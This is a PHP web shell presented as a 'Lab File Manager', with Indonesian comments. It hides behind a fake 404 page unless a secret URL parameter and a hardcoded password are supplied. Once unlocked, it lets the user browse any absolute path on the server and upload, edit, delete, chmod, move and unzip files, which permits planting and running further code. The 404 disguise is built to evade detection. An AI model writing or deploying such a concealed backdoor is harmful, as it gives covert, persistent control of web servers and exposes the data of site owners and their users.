<?php
declare(strict_types=1);
/**
 * Lab File Manager - Hidden Login
 */

session_start(['cookie_httponly'=>true,'cookie_samesite'=>'Strict','use_strict_mode'=>true]);

// ==========================================
// KONFIGURASI
// ==========================================
$AUTH_PASSWORD = 'PasswordLab123!'; // <--- GANTI PASSWORD LOGIN DI SINI
$ROOT_DIR      = __DIR__;           
$MAX_UP        = 50 * 1024 * 1024;  

// Kunci rahasia untuk memunculkan halaman login
$SECRET_KEY    = 'rahasia'; 
$SECRET_VAL    = 'login';

// ==========================================
// SISTEM & HELPER
// ==========================================
const PREVIEW  = ['txt','md','log','json','csv','xml','yml','yaml','ini','conf','css','js','py','c','h','java','go','rs','rb','sql'];
const IMG_EXT  = ['png','jpg','jpeg','gif','webp','bmp'];
const ZIP_EXT  = ['zip','jar','epub','docx','xlsx','pptx','odt'];
const WEB_EXT  = ['php','html','htm','xhtml','js','css'];

function h($s): string { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
function csrf(): string { if (empty($_SESSION['csrf'])) $_SESSION['csrf']=bin2hex(random_bytes(16)); return $_SESSION['csrf']; }
function csrf_check(): void {
    if (empty($_POST['csrf']) || !hash_equals($_SESSION['csrf']??'', $_POST['csrf'])) { http_response_code(400); exit('CSRF invalid'); }
}
function flash(string $m,string $t='ok'): void { $_SESSION['flash']=['m'=>$m,'t'=>$t]; }
function get_flash(): ?array { $f=$_SESSION['flash']??null; unset($_SESSION['flash']); return $f; }

function safe(string $path): string {
    global $ROOT_DIR;
    if ($path === '') return realpath($ROOT_DIR);
    if ($path[0] === '/') return realpath($path); 
    return realpath($ROOT_DIR . '/' . $path);
}

function rel(string $abs): string {
    global $ROOT_DIR;
    $r = realpath($ROOT_DIR); $a = realpath($abs);
    if ($r===false||$a===false) return $abs;
    return ltrim(substr($a, strlen($r)), '/\\');
}
function perms(string $p): string { return substr(sprintf('%o', fileperms($p)), -4); }
function is_zip(string $p): bool {
    if (!class_exists('ZipArchive')) return false;
    $z=new ZipArchive();
    if ($z->open($p)===true) { $z->close(); return true; }
    return false;
}

// ==========================================
// LOGIKA PENYAMARAN 404 & LOGIN
// ==========================================
$action = $_GET['action'] ?? 'list';

// Jika belum login DAN tidak ada parameter rahasia, tampilkan 404.
if (empty($_SESSION['auth']) && (!isset($_GET[$SECRET_KEY]) || $_GET[$SECRET_KEY] !== $SECRET_VAL)) {
    http_response_code(404);
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>404 - Page Not Found</title>
    <style>
        div.logo { height: 200px; width: 155px; display: inline-block; opacity: 0.08; position: absolute; top: 2rem; left: 50%; margin-left: -73px; }
        body { height: 100%; background: #fafafa; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; color: #777; font-weight: 300; }
        h1 { font-weight: lighter; letter-spacing: normal; font-size: 3rem; margin-top: 0; margin-bottom: 0; color: #222; }
        .wrap { max-width: 1024px; margin: 5rem auto; padding: 2rem; background: #fff; text-align: center; border: 1px solid #efefef; border-radius: 0.5rem; position: relative; }
        pre { white-space: normal; margin-top: 1.5rem; }
        code { background: #fafafa; border: 1px solid #efefef; padding: 0.5rem 1rem; border-radius: 5px; display: block; }
        p { margin-top: 1.5rem; }
        .footer { margin-top: 2rem; border-top: 1px solid #efefef; padding: 1em 2em 0 2em; font-size: 85%; color: #999; }
        a:active, a:link, a:visited { color: #dd4814; }
    </style>
</head>
<body>
    <div class="wrap">
        <h1>404</h1>
        <p>Sorry! Cannot seem to find the page you were looking for.</p>
    </div>
</body>
</html>';
    exit;
}

// Jika sudah login, tapi URL tidak ada ?rahasia=login (misal karena pencet logout atau refresh), 
// kita biarkan session berjalan. Tapi jika request logout, kita tendang ke 404 lagi.
if ($action === 'logout') {
    $_SESSION=[]; session_destroy(); header('Location: ./'); exit;
}

// --- LOGIN LOGIC ---
if (empty($_SESSION['auth'])) {
    $err='';
    if ($_SERVER['REQUEST_METHOD']==='POST') {
        csrf_check();
        if (hash_equals($AUTH_PASSWORD, $_POST['password'] ?? '')) {
            session_regenerate_id(true); $_SESSION['auth']=true;
            header('Location: ?'.$SECRET_KEY.'='.$SECRET_VAL); exit;
        }
        $err='Password salah.';
    }
    ?><!doctype html><meta charset="utf-8"><title>Login</title>
    <style>body{font-family:system-ui;max-width:340px;margin:80px auto;padding:20px}input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:6px}button{width:100%;padding:10px;background:#0969da;color:#fff;border:0;border-radius:6px;cursor:pointer;font-size:15px}.err{background:#ffebe9;color:#cf222e;padding:10px;border-radius:6px;margin-bottom:12px}</style>
    <h2>🔒 Login</h2><?php if ($err): ?><div class="err"><?=h($err)?></div><?php endif; ?>
    <form method="post"><input type="hidden" name="csrf" value="<?=h(csrf())?>">
    <input type="password" name="password" placeholder="Password" required autofocus>
    <button>Masuk</button></form><?php exit;
}

// ==========================================
// POST OPS (JALAN HANYA JIKA SUDAH LOGIN)
// ==========================================
if ($_SERVER['REQUEST_METHOD']==='POST') {
    csrf_check();
    $dir = safe($_POST['dir'] ?? '');
    if (!$dir || !is_dir($dir)) { flash('Folder tidak valid.', 'err'); header('Location: ?'.$SECRET_KEY.'='.$SECRET_VAL); exit; }
    
    try {
        switch ($_POST['op'] ?? '') {
            case 'upload':
                if (($_FILES['file']['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) throw new RuntimeException('Upload gagal.');
                $f=$_FILES['file'];
                if ($f['size']>$MAX_UP) throw new RuntimeException('File > 50MB.');
                if (!move_uploaded_file($f['tmp_name'], $dir.'/'.basename($f['name']))) throw new RuntimeException('Gagal simpan file.');
                flash('Upload OK: '.basename($f['name'])); break;

            case 'mkdir':
                $n=trim($_POST['name']??'');
                if ($n===''||strpbrk($n,"/\\")!==false) throw new RuntimeException('Nama folder tidak valid.');
                if (!mkdir($dir.'/'.$n,0755)) throw new RuntimeException('mkdir gagal.');
                flash('Folder dibuat: '.$n); break;

            case 'newfile':
                $n=basename(trim($_POST['name']??''));
                if ($n==='') throw new RuntimeException('Nama file kosong.');
                $p=$dir.'/'.$n;
                if (file_exists($p)) throw new RuntimeException('File sudah ada.');
                if (file_put_contents($p,'')===false) throw new RuntimeException('Gagal buat file.');
                flash('File dibuat: '.$n); break;

            case 'rename':
                $old=safe($_POST['old']??''); $new=basename(trim($_POST['new']??''));
                if ($new==='') throw new RuntimeException('Nama baru kosong.');
                if (!rename($old, dirname($old).'/'.$new)) throw new RuntimeException('rename gagal.');
                flash('Rename OK.'); break;

            case 'move':
                $src=safe($_POST['src']??''); $dst=safe($_POST['dst']??'');
                if (!is_dir($dst)) throw new RuntimeException('Tujuan bukan folder.');
                $target=$dst.'/'.basename($src);
                if (file_exists($target)) throw new RuntimeException('Sudah ada nama sama di tujuan.');
                if (!rename($src,$target)) throw new RuntimeException('move gagal.');
                flash('Dipindah ke '.$dst); break;

            case 'delete':
                $p=safe($_POST['path']??'');
                if (is_dir($p)) {
                    $it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($p,FilesystemIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST);
                    foreach ($it as $x) $x->isDir()?rmdir($x->getPathname()):unlink($x->getPathname());
                    rmdir($p);
                } else unlink($p);
                flash('Dihapus.'); break;

            case 'edit_save':
                $p=safe($_POST['path']??'');
                file_put_contents($p, $_POST['content']??'');
                flash('Disimpan.'); break;

            case 'chmod':
                $p=safe($_POST['path']??'');
                if (!file_exists($p)) throw new RuntimeException('Tidak ada.');
                $m=trim($_POST['mode']??'');
                if (!preg_match('/^0?[0-7]{3}$/', $m)) throw new RuntimeException('Mode oktal 3-4 digit.');
                if (strlen($m)===3) $m='0'.$m;
                if (!chmod($p, octdec($m))) throw new RuntimeException('chmod gagal.');
                flash('chmod '.$m.' OK'); break;

            case 'unzip':
                $zp=safe($_POST['zip']??'');
                if (!is_file($zp)) throw new RuntimeException('File tidak ada.');
                if (!class_exists('ZipArchive')) throw new RuntimeException('Ekstensi PHP "zip" tidak aktif.');
                $zip=new ZipArchive();
                if ($zip->open($zp)!==true) throw new RuntimeException('Bukan zip valid.');
                $dest=dirname($zp);
                for ($i=0;$i<$zip->numFiles;$i++) {
                    $n=$zip->getNameIndex($i);
                    if (strpos($n,'..')!==false || strpos($n,"\0")!==false) continue;
                    $full=$dest.'/'.$n;
                    if (substr($n,-1)==='/') { if (!is_dir($full)) mkdir($full,0755,true); }
                    else { if (!is_dir(dirname($full))) mkdir(dirname($full),0755,true); file_put_contents($full,$zip->getFromIndex($i)); }
                }
                $zip->close(); flash('Unzip selesai: '.basename($zp)); break;

            default: throw new RuntimeException('Op tidak dikenal.');
        }
    } catch (Throwable $e) { flash($e->getMessage(),'err'); }
    header('Location: ?'.$SECRET_KEY.'='.$SECRET_VAL.'&dir='.urlencode($_POST['dir']??'')); exit;
}

// ==========================================
// GET OPS
// ==========================================
if ($action==='download') {
    $p=safe($_GET['path']??'');
    if (!is_file($p)) { http_response_code(404); exit('Not found'); }
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($p).'"');
    header('Content-Length: '.filesize($p)); readfile($p); exit;
}

if ($action==='view') {
    $p=safe($_GET['path']??'');
    if (!is_file($p)) exit('Tidak ada.');
    $ext=strtolower(pathinfo($p,PATHINFO_EXTENSION));
    if (in_array($ext, PREVIEW, true)) { header('Content-Type: text/plain; charset=utf-8'); echo file_get_contents($p); exit; }
    if (in_array($ext, IMG_EXT, true)) {
        $mime=['png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','webp'=>'image/webp','bmp'=>'image/bmp'][$ext];
        header('Content-Type: '.$mime); readfile($p); exit;
    }
    exit('Preview tidak didukung.');
}

if ($action==='edit') {
    $p=safe($_GET['path']??'');
    if (!is_file($p)) exit('Tidak ada.');
    $c=file_get_contents($p); $relp=rel($p); $d=dirname($relp); if ($d==='.') $d='';
    ?><!doctype html><meta charset="utf-8"><title>Edit</title>
    <style>body{font-family:system-ui;margin:20px}textarea{width:100%;height:65vh;font-family:monospace;padding:10px;box-sizing:border-box;border:1px solid #ccc;border-radius:6px}button,a{display:inline-block;padding:8px 14px;border-radius:6px;font-size:14px;text-decoration:none}button{background:#0969da;color:#fff;border:0;cursor:pointer}a{background:#eaeef2;color:#24292f;margin-left:6px}</style>
    <h3>📝 <?=h(basename($p))?></h3>
    <form method="post"><input type="hidden" name="csrf" value="<?=h(csrf())?>">
      <input type="hidden" name="op" value="edit_save"><input type="hidden" name="path" value="<?=h($relp)?>"><input type="hidden" name="dir" value="<?=h($d)?>">
      <textarea name="content"><?=h($c)?></textarea>
      <p><button>Simpan</button><a href="?<?=$SECRET_KEY?>">Batal</a></p></form><?php exit;
}

// ==========================================
// LISTING
// ==========================================
$dirRel = $_GET['dir'] ?? '';
$dir = safe($dirRel);
if (!$dir || !is_dir($dir)) { $dir = realpath($ROOT_DIR); $dirRel = ''; }

$entries = @scandir($dir) ?: [];
$entries = array_values(array_filter($entries, fn($e)=>$e!=='.'&&$e!=='..'));
usort($entries, function($a,$b) use ($dir){
    $da=is_dir("$dir/$a"); $db=is_dir("$dir/$b");
    return $da!==$db ? ($da?-1:1) : strcasecmp($a,$b);
});

$flash=get_flash(); $tok=csrf(); $dirH=h($dir);
$parent=$dir==='/'?'/':dirname($dir); 
$parts = explode('/', trim($dir, '/'));
$crumbs=[[''=>'/']];
$acc='';
if ($dir !== '/') {
    foreach ($parts as $seg) {
        $acc .= '/'.$seg;
        $crumbs[]=[$acc, $seg];
    }
}
$zipOk = class_exists('ZipArchive');
?><!doctype html>
<html><head><meta charset="utf-8"><title>File Manager</title>
<style>
body{font-family:system-ui;margin:0;padding:16px;background:#f6f8fa;font-size:14px}
.bar{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
.bar a,.bar button{padding:6px 12px;background:#fff;border:1px solid #d0d7de;border-radius:6px;color:#24292f;text-decoration:none;cursor:pointer;font-size:13px}
.bar a:hover,.bar button:hover{background:#eef1f4}
.bar input[type=text]{padding:6px;border:1px solid #d0d7de;border-radius:6px;font-size:13px;width:120px}
.crumb{font-family:monospace;background:#fff;padding:8px 12px;border-radius:6px;border:1px solid #d0d7de;margin-bottom:12px;overflow-x:auto;white-space:nowrap}
.crumb a{color:#0969da;text-decoration:none}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.05)}
th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #eaeef2;font-size:13px;vertical-align:middle}
th{background:#f6f8fa;font-weight:600;color:#57606a}
tr:hover td{background:#fafbfc}
.acts form{display:inline}
.acts a, .acts button{background:none;border:0;color:#0969da;cursor:pointer;font-size:13px;padding:0;margin-right:12px;text-decoration:none}
.acts button.del, .acts a.del{color:#cf222e}
code{font-size:12px;background:#f6f8fa;padding:2px 6px;border-radius:4px;border:1px solid #d0d7de}
.flash{padding:10px 14px;border-radius:6px;margin-bottom:12px;font-size:13px}
.flash.ok{background:#dafbe1;border:1px solid #a7e5b8;color:#0a3622}
.flash.err{background:#ffebe9;border:1px solid #ffcecb;color:#82071e}
a{color:#0969da;text-decoration:none}
</style></head><body>

<div class="bar">
  <strong style="margin-right:10px;">File Manager</strong>
  <a href="?<?=$SECRET_KEY?>=<?=$SECRET_VAL?>&dir=<?=h($parent)?>">Up</a>
  <form method="post" style="display:inline"><input type="hidden" name="csrf" value="<?=h($tok)?>"><input type="hidden" name="op" value="mkdir"><input type="hidden" name="dir" value="<?=h($dirH)?>">
    <input type="text" name="name" placeholder="nama folder" required><button>Buat Folder</button></form>
  <form method="post" style="display:inline"><input type="hidden" name="csrf" value="<?=h($tok)?>"><input type="hidden" name="op" value="newfile"><input type="hidden" name="dir" value="<?=h($dirH)?>">
    <input type="text" name="name" placeholder="nama file" required><button>Buat File</button></form>
  <form method="post" enctype="multipart/form-data" style="display:inline"><input type="hidden" name="csrf" value="<?=h($tok)?>"><input type="hidden" name="op" value="upload"><input type="hidden" name="dir" value="<?=h($dirH)?>">
    <input type="file" name="file" required><button>Upload</button></form>
  <a href="?action=logout" onclick="return confirm('Logout?')" style="margin-left:auto;color:#cf222e;">Logout</a>
</div>

<?php if (!$zipOk): ?><div class="flash err">Ekstensi PHP "zip" tidak aktif. Fitur Unzip tidak tersedia.</div><?php endif; ?>

<div class="crumb"><?php foreach ($crumbs as $i=>$c): ?><?php if ($i>0) echo ' / '; ?><a href="?<?=$SECRET_KEY?>=<?=$SECRET_VAL?>&dir=<?=h($c[0])?>"><?=h($c[1])?></a><?php endforeach; ?></div>

<?php if ($flash): ?><div class="flash <?=h($flash['t'])?>"><?=h($flash['m'])?></div><?php endif; ?>

<table>
<thead><tr><th>Nama</th><th>Perm</th><th>Ukuran</th><th>Diubah</th><th>Aksi</th></tr></thead>
<tbody>
<?php if (!$entries): ?><tr><td colspan="5" style="text-align:center;color:#888">(kosong)</td></tr><?php endif; ?>
<?php foreach ($entries as $name):
    $full=$dir.'/'.$name; $isDir=is_dir($full);
    $relp=$full; 
    $perm=perms($full);
    $size=$isDir?'-':number_format(filesize($full)).' B';
    $mt=date('Y-m-d H:i',filemtime($full));
    $ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
    $looksZip = !$isDir && (in_array($ext, ZIP_EXT, true) || preg_match('/\.zip$/i', $name));
    $isZip = $looksZip && $zipOk && is_zip($full);
    
    // URL untuk "Buka" jika berada di dalam public_html
    $httpUrl = '';
    if (strpos($dir, 'public_html') !== false) {
        $urlPath = substr($full, strpos($full, 'public_html') + 11);
        $httpUrl = '/'.ltrim($urlPath, '/');
    }
?>
<tr>
  <td>
    <?php if ($isDir): ?><a href="?<?=$SECRET_KEY?>=<?=$SECRET_VAL?>&dir=<?=h($relp)?>">[FOLDER] <?=h($name)?></a>
    <?php elseif (in_array($ext, PREVIEW, true) || in_array($ext, IMG_EXT, true)): ?>
      <a href="?<?=$SECRET_KEY?>=<?=$SECRET_VAL?>&action=view&path=<?=h($relp)?>" target="_blank"><?=h($name)?></a>
    <?php else: ?><?=h($name)?><?php endif; ?>
  </td>
  <td><code><?=h($perm)?></code></td>
  <td><?=h($size)?></td>
  <td><?=h($mt)?></td>
  <td class="acts">
    <?php if (!$isDir): ?>
      <form method="get" style="display:inline"><input type="hidden" name="<?=$SECRET_KEY?>" value="<?=$SECRET_VAL?>"><input type="hidden" name="action" value="download"><input type="hidden" name="path" value="<?=h($relp)?>"><button>Download</button></form>
      <form method="get" style="display:inline"><input type="hidden" name="<?=$SECRET_KEY?>" value="<?=$SECRET_VAL?>"><input type="hidden" name="action" value="edit"><input type="hidden" name="path" value="<?=h($relp)?>"><button>Edit</button></form>
      
      <?php if ($httpUrl && in_array($ext, WEB_EXT, true)): ?>
        <a href="<?=h($httpUrl)?>" target="_blank">Buka</a>
      <?php endif; ?>

      <?php if ($isZip): ?>
        <form method="post" style="display:inline" onsubmit="return confirm('Unzip <?=h(addslashes($name))?> ?')"><input type="hidden" name="csrf" value="<?=h($tok)?>"><input type="hidden" name="op" value="unzip"><input type="hidden" name="zip" value="<?=h($relp)?>"><input type="hidden" name="dir" value="<?=h($dirH)?>"><button>Unzip</button></form>
      <?php endif; ?>
    <?php endif; ?>
    
    <form method="post" style="display:inline" onsubmit="var n=prompt('Nama baru:');if(!n)return false;this.new.value=n;return true"><input type="hidden" name="csrf" value="<?=h($tok)?>"><input type="hidden" name="op" value="rename"><input type="hidden" name="old" value="<?=h($relp)?>"><input type="hidden" name="dir" value="<?=h($dirH)?>"><input type="hidden" name="new" value=""><button>Rename</button></form>
    <form method="post" style="display:inline" onsubmit="var d=prompt('Pindah ke folder (absolute path):','<?=h($dir)?>');if(d===null)return false;this.dst.value=d;return true"><input type="hidden" name="csrf" value="<?=h($tok)?>"><input type="hidden" name="op" value="move"><input type="hidden" name="src" value="<?=h($relp)?>"><input type="hidden" name="dst" value=""><button>Move</button></form>
    <form method="post" style="display:inline" onsubmit="var m=prompt('Mode oktal (contoh 0555):','<?=h($perm)?>');if(!m)return false;this.mode.value=m;return true"><input type="hidden" name="csrf" value="<?=h($tok)?>"><input type="hidden" name="op" value="chmod"><input type="hidden" name="path" value="<?=h($relp)?>"><input type="hidden" name="mode" value=""><button>chmod</button></form>
    <form method="post" style="display:inline" onsubmit="return confirm('Hapus <?=h(addslashes($name))?> ?')"><input type="hidden" name="csrf" value="<?=h($tok)?>"><input type="hidden" name="op" value="delete"><input type="hidden" name="path" value="<?=h($relp)?>"><input type="hidden" name="dir" value="<?=h($dirH)?>"><button class="del">Hapus</button></form>
  </td>
</tr>
<?php endforeach; ?>
</tbody></table>
</body></html>
